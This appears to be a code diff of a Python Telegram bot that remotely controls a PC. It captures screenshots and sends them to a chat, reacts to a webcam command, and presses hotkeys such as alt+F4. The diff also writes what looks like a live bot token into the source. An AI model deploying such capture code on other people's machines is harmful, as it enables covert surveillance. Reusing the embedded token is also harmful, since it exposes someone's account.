@@ -7,7 +7,7 @@ import pyautogui as pg
 
 t = time.strftime("%X")
 beta = 2
-bot = telebot.TeleBot("TOKEN")
+bot = telebot.TeleBot("5555601436:AAF9PG0NwRj4HhZgR0LG4Jp0ohYXkOjXeL0")
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     
@@ -65,7 +65,9 @@ def echo_all(message):
         bot.send_message(message.chat.id, "Отлично!", reply_markup=markup2)
     if message.text == "Скрин":
         screen = pyautogui.screenshot()
-        bot.send_photo(message.chat.id, screen)  
+        bot.send_photo(message.chat.id, screen)
+    
+     
     if message.text == "Вебка":
         bot.send_message(message.chat.id, "Подождите 15сек...", reply_markup=markup)
         pg.hotkey("win", "d")
@@ -87,6 +89,8 @@ def echo_all(message):
 
     if message.text == "Далее":
         bot.send_message(message.chat.id, "Вторая панель", reply_markup=markup2)
+    if message.text == "Назад":
+        bot.send_message(message.chat.id, "Первая панель", reply_markup=markup)
     if message.text == "Закрыть вкладку":
         bot.send_message(message.chat.id, "Вкладка успешно была закрыта", reply_markup=markup2)
         pg.hotkey("alt", "F4")
